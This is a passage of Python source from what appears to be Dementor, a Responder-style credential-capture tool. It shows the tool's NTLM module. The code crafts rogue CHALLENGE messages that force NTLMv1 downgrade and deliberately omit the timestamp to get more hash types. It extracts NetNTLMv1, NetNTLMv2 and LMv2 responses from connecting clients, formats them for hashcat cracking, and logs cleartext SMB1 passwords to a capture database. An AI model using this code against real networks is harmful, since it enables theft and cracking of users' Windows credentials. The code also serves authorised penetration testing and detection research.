    challenge_message["domain_max_len"] = len(target_name_bytes)
    challenge_message["domain_offset"] = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET
    challenge_message["domain_name"] = target_name_bytes
    challenge_message["Version"] = version_bytes
    challenge_message["VersionLen"] = NTLM_VERSION_LEN

    # TargetInfoFields (§2.2.1.2) sits immediately after TargetName in the
    # wire payload; its buffer offset is computed from TargetName's length.
    target_info_offset: int = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET + len(target_name_bytes)

    if disable_ntlmv2:
        # Omitting TargetInfoFields prevents the client from constructing
        # an NTLMv2 Blob (§3.3.2), forcing NTLMv1-capable clients to fall
        # back to NTLMv1.  Level 3+ clients will refuse to authenticate.
        challenge_message["TargetInfoFields_len"] = 0
        challenge_message["TargetInfoFields_max_len"] = 0
        challenge_message["TargetInfoFields"] = b""
        challenge_message["TargetInfoFields_offset"] = target_info_offset
    else:
        # TargetInfo is a sequence of AV_PAIR structures (§2.2.2.1).
        # Full AvId space — disposition for each entry:
        #
        #   AvId   Constant             Sent  Notes
        #   0x0000 MsvAvEOL             auto  List terminator; ntlm.AV_PAIRS appends it.
        #   0x0001 MsvAvNbComputerName  YES   MUST per spec. NetBIOS flat name, uppercase.
        #   0x0002 MsvAvNbDomainName    YES   MUST per spec. NetBIOS flat domain, uppercase.
        #   0x0003 MsvAvDnsComputerName YES   Computer FQDN.
        #   0x0004 MsvAvDnsDomainName   YES   DNS domain FQDN.
        #   0x0005 MsvAvDnsTreeName     COND  Forest FQDN; omitted when not domain-joined.
        #   0x0006 MsvAvFlags           NO    Constrained-auth flag (0x1); not applicable
        #                                     here — Dementor does not enforce constrained
        #                                     delegation.  0x2/0x4 bits are client→server.
        #   0x0007 MsvAvTimestamp       NO    Intentionally omitted; see note below.
        #   0x0008 MsvAvSingleHost      N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #   0x0009 MsvAvTargetName      N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #   0x000A MsvAvChannelBindings N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #
        # §2.2.2.1: 0x0001 and 0x0002 MUST be present.  MsvAvEOL is
        # appended automatically by ntlm.AV_PAIRS.  AV_PAIRs may appear in
        # any order per spec; ascending AvId matches real Windows behaviour.

        # AV_PAIR values used directly from kwargs — no derivation chains.
        # 0x0001 and 0x0002 are required by spec (always sent).
        # 0x0003, 0x0004, 0x0005 are optional (omitted when empty).

        # 3. Encoding -------------------------------------------------------
        # [MS-NLMP] §2.2.1.2: "If a TargetInfo AV_PAIR Value is textual,
        # it MUST be encoded in Unicode irrespective of what character set
        # was negotiated."  Force UTF-16LE regardless of negotiated flags.

        # 4. AV_PAIRS -------------------------------------------------------
        # §2.2.2.1: 0x0001 and 0x0002 MUST be present.
        # 0x0003-0x0005 are optional — omitted when empty/not configured.
        av_pairs = ntlm.AV_PAIRS()
        av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = nb_computer.encode(
            "utf-16le"
        )  # MsvAvNbComputerName (0x0001)
        av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = nb_domain.encode(
            "utf-16le"
        )  # MsvAvNbDomainName (0x0002)
        if dns_computer:
            av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = dns_computer.encode(
                "utf-16le"
            )  # MsvAvDnsComputerName (0x0003)
        if dns_domain:
            av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = dns_domain.encode(
                "utf-16le"
            )  # MsvAvDnsDomainName (0x0004)
        if dns_tree:
            av_pairs[ntlm.NTLMSSP_AV_DNS_TREENAME] = dns_tree.encode(
                "utf-16le"
            )  # MsvAvDnsTreeName (0x0005)

        # MsvAvTimestamp (0x0007) is intentionally NOT included.
        # [MS-NLMP] §2.2.2.1 footnote <15> says "always sent" but the
        # normative §3.2.5.1.1 pseudocode does NOT include AddAvPair for it.
        # Per §3.3.2: when MsvAvTimestamp IS present, the client SHOULD NOT
        # send LmChallengeResponse (sends Z(24) instead), losing the LMv2
        # companion hash. Omitting it maximizes captured hash types.
        challenge_message["TargetInfoFields_len"] = len(av_pairs)
        challenge_message["TargetInfoFields_max_len"] = len(av_pairs)
        challenge_message["TargetInfoFields"] = av_pairs
        challenge_message["TargetInfoFields_offset"] = target_info_offset

    _log = log if log is not None else dm_logger
    _log.debug(
        "NTLMSSP CHALLENGE: flags=0x%08x challenge=%s target=%s",
        response_flags,
        challenge.hex(),
        target_name_str,
        is_server=True,
    )
    return challenge_message


def _log_ntlmv2_blob(
    auth_token: ntlm.NTLMAuthChallengeResponse,
    log: ProtocolLogger,
) -> str | None:
    """Extract and log client-side AV_PAIRs from an NTLMv2 response blob.

    The NTLMv2 NtChallengeResponse is ``NTProofStr(16)`` + ``CLIENT_CHALLENGE`` blob.
    The blob contains AV_PAIRs that the client copied from the server's
    CHALLENGE_MESSAGE, plus client-added pairs like ``MsvAvTargetName`` (SPN),
    ``MsvAvTimestamp``, and ``MsvAvFlags``.

    Only called when NtChallengeResponse length > 24 (NTLMv2).

    :param auth_token: Parsed AUTHENTICATE_MESSAGE containing the NTLMv2 response
    :type auth_token: ntlm.NTLMAuthChallengeResponse
    :param log: Logger instance for output
    :type log: ProtocolLogger
    :return: MsvAvTargetName (SPN) if present, else None
    :rtype: str | None
    """
    target_name: str | None = None
    try:
        nt_response: bytes = auth_token["ntlm"] or b""
        if len(nt_response) <= NTLMV1_RESPONSE_LEN:
            return None  # NTLMv1 — no blob

        # NTLMv2 blob starts after NTProofStr (16 bytes)
        blob = nt_response[NTLM_NTPROOFSTR_LEN:]
        if len(blob) < 32:
            return None  # Minimum blob: header(28) + MsvAvEOL(4) = 32 bytes

        # The blob has a fixed header before the AV_PAIRs:
        # Resp(1) + HiResp(1) + Reserved1(2) + Reserved2(4) + TimeStamp(8)
        #   + ChallengeFromClient(8) + Reserved3(4) = 28 bytes
        # AV_PAIRs start at offset 28 in the blob.

        # ClientChallenge — 8-byte client nonce at blob[16:24]
        client_challenge = blob[16:24]

        av_data = blob[28:]
        if not av_data:
            log.debug(
                "NTLMv2 blob: ClientChallenge=%s (no AV_PAIRs)", client_challenge.hex()
            )
            return None

        av_pairs = ntlm.AV_PAIRS(av_data)
        # impacket AV_PAIRS.__getitem__ returns (length, value_bytes) tuples

        blob_parts: list[str] = [f"ClientChallenge={client_challenge.hex()}"]

        if ntlm.NTLMSSP_AV_TARGET_NAME in av_pairs.fields:
            _, spn_raw = av_pairs[ntlm.NTLMSSP_AV_TARGET_NAME]
            target_name = spn_raw.decode("utf-16-le", errors="replace")
            blob_parts.append(f"SPN={target_name}" if target_name else "SPN=(empty)")

        if ntlm.NTLMSSP_AV_TIME in av_pairs.fields:
            _, ts_raw = av_pairs[ntlm.NTLMSSP_AV_TIME]
            if len(ts_raw) >= 8:
                ts_val = int.from_bytes(ts_raw[:8], "little")
                blob_parts.append(
                    f"Timestamp=0x{ts_val:016x}" if ts_val else "Timestamp=(empty)"
                )

        if ntlm.NTLMSSP_AV_FLAGS in av_pairs.fields:
            _, flags_raw = av_pairs[ntlm.NTLMSSP_AV_FLAGS]
            if len(flags_raw) >= 4:
                av_flags = int.from_bytes(flags_raw[:4], "little")
                blob_parts.append(
                    f"Flags=0x{av_flags:08x}" if av_flags else "Flags=(empty)"
                )

        if ntlm.NTLMSSP_AV_CHANNEL_BINDINGS in av_pairs.fields:
            _, cb_raw = av_pairs[ntlm.NTLMSSP_AV_CHANNEL_BINDINGS]
            blob_parts.append(
                f"ChannelBindings={cb_raw.hex()}"
                if cb_raw != b"\x00" * len(cb_raw)
                else "ChannelBindings=(empty)"
            )

        # MsvAvSingleHost (0x0008) — machine identity claim
        if ntlm.NTLMSSP_AV_RESTRICTIONS in av_pairs.fields:
            _, sh_raw = av_pairs[ntlm.NTLMSSP_AV_RESTRICTIONS]
            blob_parts.append(f"SingleHost={sh_raw.hex()}")

        log.debug("NTLMv2 blob: %s", " ".join(blob_parts), is_client=True)

    except Exception:
        log.debug("Failed to parse NTLMv2 blob AV_PAIRs", exc_info=True)

    return target_name


def NTLM_handle_authenticate_message(
    auth_token: ntlm.NTLMAuthChallengeResponse,
    *,
    challenge: bytes,
    client: tuple[str, int],
    session: SessionConfig,
    logger: ProtocolLogger | None = None,
    extras: dict[str, Any] | None = None,
    transport: str = NTLM_TRANSPORT_NTLMSSP,
    negotiate_fields: dict[str, str] | None = None,
) -> bool:
    """Extract all crackable hashes from an AUTHENTICATE_MESSAGE and log them.

    Top-level entry point called by protocol handlers (SMB, HTTP, LDAP).
    Extracts every valid hashcat line (NetNTLMv2 + LMv2, or NetNTLMv1/NetNTLMv1-ESS)
    and writes each as a separate entry to the session capture database.

    :return: ``True`` if credentials were captured, ``False`` if the
        authentication was anonymous or no hashes could be extracted

    The NTLM display line is the deduped union of NEGOTIATE (Type 1) and
    AUTHENTICATE (Type 3) fields, plus the NTLMv2 blob SPN.  Type 3 fields
    take precedence when both messages supply the same key.

    :param auth_token: Parsed AUTHENTICATE_MESSAGE
    :type auth_token: ntlm.NTLMAuthChallengeResponse
    :param challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent
    :type challenge: bytes
    :param client: Client connection context (passed through to db.add_auth)
    :type client: tuple[str, int]
    :param session: Session context with a .db attribute for capture storage
    :type session: SessionConfig
    :param logger: Logger for capture output
    :type logger: ProtocolLogger | None
    :param extras: Additional metadata for db.add_auth
    :type extras: dict | None
    :param transport: NTLM transport identifier (NTLM_TRANSPORT_*); used for logging only
    :type transport: str
    :param negotiate_fields: Fields extracted from the NEGOTIATE_MESSAGE by
        :func:`NTLM_handle_negotiate_message`.  Merged (Type 3 wins) into the display line
        so the deduped output reflects both messages.  This is ntlm.py's own
        output passed back in — no protocol-layer state.
    :type negotiate_fields: dict[str, str] | None
    """
    # Use the protocol logger for session-linked messages; fall back to the
    # module logger when no protocol logger is provided.
    log = logger or dm_logger

    if _is_anonymous_authenticate(auth_token):
        log.debug("Anonymous NTLM login attempt; skipping hash extraction")
        return False

    # -- AUTHENTICATE_MESSAGE parsed fields (single debug line) ------------
    os_str: str = _decode_ntlmssp_os_version(auth_token)
    host_name_str: str = ""
    try:
        negotiate_flags: int = auth_token["flags"]
        try:
            host_name_str = (
                NTLM_decode_string(auth_token["host_name"], negotiate_flags) or ""
            )
        except Exception:
            dm_logger.debug("Failed to parse host_name from AUTHENTICATE_MESSAGE")
        mic_str: str = "(absent)"  # no VERSION flag → MIC field doesn't exist
        try:
            if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_VERSION:
                mic_val: bytes = auth_token["MIC"]
                mic_str = (
                    mic_val.hex()
                    if mic_val and len(mic_val) == 16 and mic_val != b"\x00" * 16
                    else "(empty)"
                )
        except Exception:  # noqa: S110
            pass
        auth_parts = [f"flags=0x{negotiate_flags:08x}"]
        auth_parts.append(f"os={os_str!r}" if os_str else "os=(empty)")
        user_name: str = NTLM_decode_string(auth_token["user_name"], negotiate_flags)
        domain_name: str = NTLM_decode_string(auth_token["domain_name"], negotiate_flags)
        auth_parts.append(f"user={user_name!r}" if user_name else "user=(empty)")
        auth_parts.append(f"domain={domain_name!r}" if domain_name else "domain=(empty)")
        auth_parts.append(f"name={host_name_str!r}" if host_name_str else "name=(empty)")
        nt_len = len(auth_token["ntlm"] or b"")
        lm_len = len(auth_token["lanman"] or b"")
        auth_parts.append(f"NT_len={nt_len}")
        auth_parts.append(f"LM_len={lm_len}")
        auth_parts.append(f"MIC={mic_str}")
        log.debug("NTLMSSP AUTHENTICATE: %s", " ".join(auth_parts), is_client=True)
    except Exception:
        log.debug("Failed to parse AUTHENTICATE_MESSAGE fields", exc_info=True)
        try:
            negotiate_flags = auth_token["flags"]
        except Exception:
            negotiate_flags = 0
        user_name = ""
        domain_name = ""

    # -- Hash extraction ---------------------------------------------------
    try:
        all_hashes = NTLM_to_hashcat(
            server_challenge=challenge,
            user_name=auth_token["user_name"],
            domain_name=auth_token["domain_name"],
            lm_response=auth_token["lanman"],
            nt_response=auth_token["ntlm"],
            negotiate_flags=negotiate_flags,
        )

        if not all_hashes:
            log.debug(
                "AUTHENTICATE_MESSAGE produced no crackable hashes "
                "(user=%r flags=0x%08x)",
                auth_token["user_name"],
                negotiate_flags,
            )
            return False

        # -- NTLMv2 client blob AV_PAIRs (single debug line) --------------
        spn = _log_ntlmv2_blob(auth_token, log)

        # -- Consolidated display line (Type 1 + Type 3 deduped) -----------
        # Collect all identity fields into sets so values from both
        # NEGOTIATE (Type 1) and AUTHENTICATE (Type 3) are shown,
        # with duplicates removed.  Empty strings are filtered.
        ntlm_fields: dict[str, set[str]] = {
            "os": set(),
            "user": set(),
            "domain": set(),
            "name": set(),
            "SPN": set(),
        }
        # Add Type 1 (NEGOTIATE) fields
        if negotiate_fields:
            for k, v in negotiate_fields.items():
                if v and k in ntlm_fields:
                    ntlm_fields[k].add(v)
        # Add Type 3 (AUTHENTICATE) fields
        if os_str:
            ntlm_fields["os"].add(os_str)
        if user_name:
            ntlm_fields["user"].add(user_name)
        if domain_name:
            ntlm_fields["domain"].add(domain_name)
        if host_name_str:
            ntlm_fields["name"].add(host_name_str)
        if spn:
            ntlm_fields["SPN"].add(spn)

        display_keys = [
            ("os", "os"),
            ("user", "user"),
            ("domain", "domain"),
            ("name", "name"),
            ("SPN", "SPN"),
        ]
        parts = [
            f"{label}:{','.join(sorted(ntlm_fields[k]))}"
            for k, label in display_keys
            if ntlm_fields.get(k)
        ]
        if parts:
            log.info("NTLM: %s", " | ".join(parts))

        log.debug(
            "Writing %d hash(es) to capture database for user=%r domain=%r",
            len(all_hashes),
            user_name,
            domain_name,
        )
        # Build host_info for model.py from extracted fields.
        host_parts: list[str] = []
        if os_str:
            host_parts.append(os_str)
        if host_name_str:
            host_parts.append(f"(name: {host_name_str})")
        if domain_name:
            host_parts.append(f"(domain: {domain_name})")
        host_info = " ".join(host_parts) if host_parts else None
        extras = extras or {}
        extras[_HOST_INFO] = host_info

        for version_label, hashcat_line in all_hashes:
            session.db.add_auth(
                client=client,
                credtype=version_label,
                username=user_name,
                domain=domain_name,
                password=hashcat_line,
                logger=logger,
                extras=extras,
            )

        return bool(all_hashes)

    except ValueError:
        log.exception(
            "Invalid data in AUTHENTICATE_MESSAGE (bad challenge length or "
            "malformed response fields); skipping capture"
        )
    except Exception:
        log.exception("Failed to extract NTLM hashes from AUTHENTICATE_MESSAGE")

    return False


# --- Hash Formatting ---------------------------------------------------------


def _classify_hash_type(
    nt_response: bytes, lm_response: bytes, negotiate_flags: int
) -> str:
    """Classify the hash type from an AUTHENTICATE_MESSAGE response.

    :param nt_response: The NtChallengeResponse field
    :type nt_response: bytes
    :param lm_response: The LmChallengeResponse field
    :type lm_response: bytes
    :param negotiate_flags: The NegotiateFlags from the message
    :type negotiate_flags: int
    :return: Classification label (NTLM_V1, NTLM_V1_ESS, NTLM_V2, or NTLM_V2_LM)
    :rtype: str
    """
    # Fallback to NetNTLMv1 on TypeError (None or non-bytes input) rather than raising.
    try:
        nt_len = len(nt_response)
    except TypeError:
        dm_logger.debug(
            "nt_response is not bytes-like (%s); defaulting to %s",
            type(nt_response).__name__,
            NTLM_V1,
        )
        return NTLM_V1

    if nt_len > NTLMV1_RESPONSE_LEN:
        return NTLM_V2

    # ESS: per §3.3.1 ComputeResponse, LmChallengeResponse = ClientChallenge(8) || Z(16).
    # This mandates exactly 24 bytes; the byte structure is the sole reliable signal.
    # The NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY flag is cross-checked only.
    try:
        ess_by_lm = (
            len(lm_response) == NTLMV1_RESPONSE_LEN
            and lm_response[NTLM_CHALLENGE_LEN:] == NTLM_ESS_ZERO_PAD
        )
    except TypeError:
        dm_logger.debug(
            "lm_response is not bytes-like (%s); defaulting to %s",
            type(lm_response).__name__,
            NTLM_V1,
        )
        return NTLM_V1

    try:
        ess_by_flag = bool(
            negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        )
    except TypeError:
        ess_by_flag = False

    if ess_by_flag and not ess_by_lm:
        dm_logger.debug("ESS flag set but LM[8:24] != Z(16); classifying as %s", NTLM_V1)
    elif ess_by_lm and not ess_by_flag:
        dm_logger.debug(
            "LM[8:24] == Z(16) but ESS flag not set; classifying as %s",
            NTLM_V1_ESS,
        )

    return NTLM_V1_ESS if ess_by_lm else NTLM_V1


# When no LM hash is available (password > 14 chars or NoLMHash policy),
# the client fills LmChallengeResponse with DESL() of a known dummy input:
#   1. Z(16) -- 16 null bytes
#   2. DEFAULT_LM_HASH (AAD3B435B51404EE) -- LMOWFv1("")
# These values are deterministic and carry no crackable material.


def _compute_dummy_lm_responses(server_challenge: bytes) -> set[bytes]:
    """Compute the two known dummy LmChallengeResponse values (per §3.3.1).

    :param server_challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE
    :type server_challenge: bytes
    :return: Two 24-byte DESL() outputs for the null and empty-string LM hashes.
        Any LmChallengeResponse matching either contains no crackable material
    :rtype: set of bytes
    """
    return {
        ntlm.ntlmssp_DES_encrypt(NTLM_ESS_ZERO_PAD, server_challenge),
        ntlm.ntlmssp_DES_encrypt(ntlm.DEFAULT_LM_HASH, server_challenge),
    }


# Output formats validated against hashcat module source code
# (module_05500.c and module_05600.c):
#
# hashcat -m 5500 (NetNTLMv1 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length -- the "::" separator
#   [2] DomainName           plain text, 0-45 chars
#   [3] LmChallengeResponse  hex, 0-48 chars (0=absent, 48=present)
#   [4] NtChallengeResponse  hex, FIXED 48 chars
#   [5] ServerChallenge      hex, FIXED 16 chars
#
#   ESS auto-detection: if [3] is 48 hex AND bytes 8-23 are zero,
#   hashcat computes MD5(ServerChallenge || ClientChallenge)[0:8]
#   internally.
#   Do NOT pre-compute FinalChallenge; always emit raw ServerChallenge.
#
#   Identity: UserName is null-expanded to UTF-16LE as-is (no toupper).
#
# hashcat -m 5600 (NetNTLMv2 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length
#   [2] DomainName           plain text, 0-45 chars (case-sensitive)
#   [3] ServerChallenge      hex, FIXED 16 chars
#   [4] NTProofStr           hex, FIXED 32 chars
#   [5] Blob                 hex, 2-1024 chars
#
#   Identity: hashcat applies C toupper() to UserName bytes, then
#   null-expands to UTF-16LE.  DomainName used as-is.
#   User/Domain MUST be decoded plain-text strings, NOT raw hex bytes.


def NTLM_to_hashcat(
    server_challenge: bytes,
    user_name: bytes | str,
    domain_name: bytes | str,
    lm_response: bytes | None,
    nt_response: bytes | None,
    negotiate_flags: int,
) -> list[tuple[str, str]]:
    """Extract all crackable hashcat lines from an AUTHENTICATE_MESSAGE.

    Returns up to two entries: the primary hash and, for NetNTLMv2, the LMv2
    companion. Callers must check for anonymous auth before invoking.

    :param server_challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent
    :type server_challenge: bytes
    :param user_name: UserName from the AUTHENTICATE_MESSAGE
    :type user_name: bytes | str
    :param domain_name: DomainName from the AUTHENTICATE_MESSAGE
    :type domain_name: bytes | str
    :param lm_response: LmChallengeResponse from the AUTHENTICATE_MESSAGE
    :type lm_response: bytes | None
    :param nt_response: NtChallengeResponse from the AUTHENTICATE_MESSAGE
    :type nt_response: bytes | None
    :param negotiate_flags: NegotiateFlags from the NTLM exchange
    :type negotiate_flags: int
    :return: (label, hashcat_line) tuples. Labels: NTLM_V2 ("NetNTLMv2"),
        NTLM_V2_LM ("LMv2"), NTLM_V1_ESS ("NetNTLMv1-ESS"), NTLM_V1 ("NetNTLMv1")
    :rtype: list of (str, str)
    :raises ValueError: If server_challenge is not exactly NTLM_CHALLENGE_LEN bytes

    .. note::

        - Hash type determined by _classify_hash_type() called once; no raw length
          comparisons appear in the branches below.
        - Dummy LM responses (DESL of null or empty-string LM hash) are discarded.
        - Level 2 duplication (LM == NT) omits the LM slot.
        - Per §3.3.2 rule 7: when MsvAvTimestamp is present, clients set
          LmChallengeResponse to Z(24); this null LMv2 is detected and skipped.
    """
    if len(server_challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"server_challenge must be {NTLM_CHALLENGE_LEN} bytes, "
            + f"got {len(server_challenge)}"
        )

    captures: list[tuple[str, str]] = []

    # -- Normalise None inputs to empty bytes --------------------------------
    lm_response = lm_response or b""
    nt_response = nt_response or b""

    # No NtChallengeResponse -> nothing to crack
    if not nt_response:
        dm_logger.debug("NtChallengeResponse is empty; skipping hash extraction")
        return captures

    # -- Decode identity strings ---------------------------------------------
    # Both hashcat modes require decoded plain-text strings, not raw wire
    # bytes.  Hashcat does its own toupper + UTF-16LE expansion internally.
    try:
        user: str = (
            NTLM_decode_string(bytes(user_name), negotiate_flags)
            if isinstance(user_name, (bytes, bytearray, memoryview))
            else (user_name or "")
        )
    except Exception:
        dm_logger.debug("Failed to decode UserName; using empty string", exc_info=True)
        user = ""

    try:
        domain: str = (
            NTLM_decode_string(bytes(domain_name), negotiate_flags)
            if isinstance(domain_name, (bytes, bytearray, memoryview))
            else (domain_name or "")
        )
    except Exception:
        dm_logger.debug("Failed to decode DomainName; using empty string", exc_info=True)
        domain = ""

    try:
        hash_type: str = _classify_hash_type(nt_response, lm_response, negotiate_flags)
    except Exception:
        dm_logger.debug(
            "_classify_hash_type raised unexpectedly; defaulting to %s",
            NTLM_V1,
            exc_info=True,
        )
        hash_type = NTLM_V1

    dm_logger.debug(
        "Extracting hashes: user=%r domain=%r hash_type=%s nt_len=%d lm_len=%d",
        user,
        domain,
        hash_type,
        len(nt_response),
        len(lm_response),
    )

    server_challenge_hex: str = server_challenge.hex()

    # NetNTLMv2: NtChallengeResponse = NTProofStr(16) + Blob(var) per §2.2.2.8
    # hashcat -m 5600: User::Domain:ServerChallenge:NTProofStr:Blob
    if hash_type == NTLM_V2:
        try:
            nt_proof_str_hex: str = nt_response[:NTLM_NTPROOFSTR_LEN].hex()
            blob_hex: str = nt_response[NTLM_NTPROOFSTR_LEN:].hex()
            captures.append(
                (
                    NTLM_V2,
                    f"{user}::{domain}"
                    + f":{server_challenge_hex}"
                    + f":{nt_proof_str_hex}"
                    + f":{blob_hex}",
                )
            )
            dm_logger.debug("Appended %s hash (nt_len=%d)", NTLM_V2, len(nt_response))
        except Exception:
            dm_logger.debug("Failed to format %s hash; skipping", NTLM_V2, exc_info=True)
            return captures

        # NetLMv2 companion: HMAC-MD5(ResponseKeyLM, Server||Client)[0:16] || CChal(8)
        # Per §3.3.2 rule 7: if MsvAvTimestamp was in the challenge, clients send Z(24).
        # hashcat -m 5600: User::Domain:ServerChallenge:LMProof:ClientChallenge
        try:
            if len(lm_response) == NTLMV1_RESPONSE_LEN:
                if lm_response == b"\x00" * NTLMV1_RESPONSE_LEN:
                    dm_logger.debug(
                        "LmChallengeResponse is Z(%d) "
                        + "(MsvAvTimestamp suppression or null LM); skipping %s",
                        NTLMV1_RESPONSE_LEN,
                        NTLM_V2_LM,
                    )
                else:
                    lm_proof_hex: str = lm_response[:NTLM_NTPROOFSTR_LEN].hex()
                    lm_cc_hex: str = lm_response[
                        NTLM_NTPROOFSTR_LEN:NTLMV1_RESPONSE_LEN
                    ].hex()
                    captures.append(
                        (
                            NTLM_V2_LM,
                            f"{user}::{domain}"
                            + f":{server_challenge_hex}"
                            + f":{lm_proof_hex}"
                            + f":{lm_cc_hex}",
                        )
                    )
                    dm_logger.debug("Appended %s companion hash", NTLM_V2_LM)
            else:
                dm_logger.debug(
                    "LmChallengeResponse length %d unexpected for %s; skipping",
                    len(lm_response),
                    NTLM_V2_LM,
                )
        except Exception:
            dm_logger.debug(
                "Failed to format %s hash; skipping", NTLM_V2_LM, exc_info=True
            )

        return captures

    # NetNTLMv1-ESS: per §3.3.1, ESS uses MD5(Server||Client)[0:8] as the challenge.
    # Hashcat -m 5500 derives the mixed challenge internally; emit raw ServerChallenge.
    # LM field: ClientChallenge(8) || Z(16) = 24 bytes.
    if hash_type == NTLM_V1_ESS:
        try:
            nt_response_hex: str = nt_response.hex()
            lm_ess_hex: str = (
                lm_response[:NTLM_CHALLENGE_LEN].hex() + NTLM_ESS_ZERO_PAD.hex()
            )
            captures.append(
                (
                    NTLM_V1_ESS,
                    f"{user}::{domain}"
                    + f":{lm_ess_hex}"
                    + f":{nt_response_hex}"
                    + f":{server_challenge_hex}",
                )
            )
            dm_logger.debug("Appended %s hash", NTLM_V1_ESS)
        except Exception:
            dm_logger.debug(
                "Failed to format %s hash; skipping", NTLM_V1_ESS, exc_info=True
            )
        return captures

    # NetNTLMv1: hashcat -m 5500: User::Domain:LM:NT:ServerChallenge
    # LM slot is optional (0 or 48 hex chars); including a real LM response
    # enables the DES third-key optimisation. Two cases skip the LM slot:
    #   1. Level 2 duplication: client copies NT into LM (wrong one-way function).
    #   2. Dummy LM: DESL() with null/empty-string hash — no crackable material.
    try:
        nt_response_hex = nt_response.hex()
        lm_slot_hex: str = ""

        if len(lm_response) == NTLMV1_RESPONSE_LEN:
            if lm_response == nt_response:
                # Case 1: duplication — LM is a copy of NT, skip it
                dm_logger.debug(
                    "LmChallengeResponse == NtChallengeResponse "
                    + "(Level 2 duplication); omitting LM slot"
                )
            elif lm_response in _compute_dummy_lm_responses(server_challenge):
                # Case 2: dummy DESL output — no crackable credential material
                dm_logger.debug(
                    "LmChallengeResponse matches dummy LM hash; omitting LM slot"
                )
            else:
                # Real LmChallengeResponse: include for DES third-key optimisation
                lm_slot_hex = lm_response.hex()
                dm_logger.debug("Including real LmChallengeResponse in %s hash", NTLM_V1)

        captures.append(
            (
                NTLM_V1,
                f"{user}::{domain}"
                + f":{lm_slot_hex}"
                + f":{nt_response_hex}"
                + f":{server_challenge_hex}",
            )
        )
        dm_logger.debug("Appended %s hash (lm_slot_empty=%s)", NTLM_V1, lm_slot_hex == "")
    except Exception:
        dm_logger.debug("Failed to format %s hash; skipping", NTLM_V1, exc_info=True)

    return captures


# --- Legacy SMB1 Basic Auth (non-NTLMSSP) -----------------------------------


def NTLM_handle_legacy_raw_auth(
    *,
    user_name: bytes | str,
    domain_name: bytes | str,
    lm_response: bytes | None,
    nt_response: bytes | None,
    challenge: bytes,
    client: tuple[str, int],
    session: SessionConfig,
    logger: ProtocolLogger | None = None,
    extras: dict[str, Any] | None = None,
    transport: str = NTLM_TRANSPORT_RAW,
    cleartext_password: str | None = None,
) -> None:
    """Extract and report hashes from raw SMB1 basic-security fields.

    This is NOT an NTLMSSP message handler. It processes raw LM/NT
    challenge-response hashes from the SMB1 basic security path
    (WordCount=13), used only by very old legacy clients that do not
    support NTLMSSP/SPNEGO.

    For NTLM_TRANSPORT_RAW: classifies LM/NT response bytes and formats
    hashcat lines using the existing pipeline. No NTLMSSP wrapper exists
    on this path — do NOT create a fake NTLMAuthChallengeResponse.

    For NTLM_TRANSPORT_CLEARTEXT: stores the raw password directly.

    :param user_name: AccountName from SESSION_SETUP_ANDX
    :type user_name: bytes | str
    :param domain_name: PrimaryDomain from SESSION_SETUP_ANDX
    :type domain_name: bytes | str
    :param lm_response: OEMPassword (LM response) — None for cleartext
    :type lm_response: bytes | None
    :param nt_response: UnicodePassword (NT response) — None for cleartext
    :type nt_response: bytes | None
    :param challenge: 8-byte server challenge from negotiate
    :type challenge: bytes
    :param client: (host, port) tuple
    :type client: tuple[str, int]
    :param session: Session context with .db
    :type session: SessionConfig
    :param logger: Protocol logger
    :type logger: ProtocolLogger | None
    :param extras: Additional metadata
    :type extras: dict[str, Any] | None
    :param transport: NTLM_TRANSPORT_RAW or NTLM_TRANSPORT_CLEARTEXT
    :type transport: str
    :param cleartext_password: Raw password for cleartext transport
    :type cleartext_password: str | None
    """
    log = logger or dm_logger

    # Decode identity strings
    user: str = (
        user_name.decode("utf-16-le", errors="replace")
        if isinstance(user_name, (bytes, bytearray, memoryview))
        else (user_name or "")
    )
    # Protocol handlers should decode strings before calling this function.
    # The bytes fallback assumes UTF-16LE for safety — only reachable if
    # a caller passes raw bytes directly.
    domain: str = (
        domain_name.decode("utf-16-le", errors="replace")
        if isinstance(domain_name, (bytes, bytearray, memoryview))
        else (domain_name or "")
    )

    if transport == NTLM_TRANSPORT_CLEARTEXT:
        if not cleartext_password:
            log.debug("Empty cleartext password; skipping capture")
            return

        log.success(
            f"Cleartext password captured: {user}\\{domain}",
        )
        extras = extras or {}
        host_parts: list[str] = []
        if extras.get("os"):
            host_parts.append(extras.pop("os"))
        if domain:
            host_parts.append(f"(domain: {domain})")
        extras[_HOST_INFO] = " ".join(host_parts) if host_parts else "SMB1 cleartext"
        session.db.add_auth(
            client=client,
            credtype="Cleartext",
            username=user,
            domain=domain,
            password=cleartext_password,
            logger=logger,
            extras=extras,
        )
        return

    # RAW transport — classify and format hashes
    lm_response = lm_response or b""
    nt_response = nt_response or b""

    # Anonymous check — empty user + empty NT + empty/null LM
    if not user and not nt_response and (not lm_response or lm_response == b"\x00"):
        log.debug("Anonymous SMB1 basic-security login; skipping hash extraction")
        return

    if not nt_response and not lm_response:
        log.debug("Both LM and NT responses empty; skipping")
        return

    try:
        # negotiate_flags=0: no NTLMSSP flags exist on this path
        all_hashes = NTLM_to_hashcat(
            server_challenge=challenge,
            user_name=user,
            domain_name=domain,
            lm_response=lm_response,
            nt_response=nt_response,
            negotiate_flags=0,
        )

        if not all_hashes:
            log.debug(
                "SMB1 basic-security auth produced no crackable hashes (user=%r)",
                user,
            )
            return

        log.debug(
            "Writing %d hash(es) from SMB1 basic-security for user=%r",
            len(all_hashes),
            user,
        )
        extras = extras or {}
        # Build host_info from available SMB1 basic-security fields.
        # SMB1 basic-security has NativeOS and PrimaryDomain but no
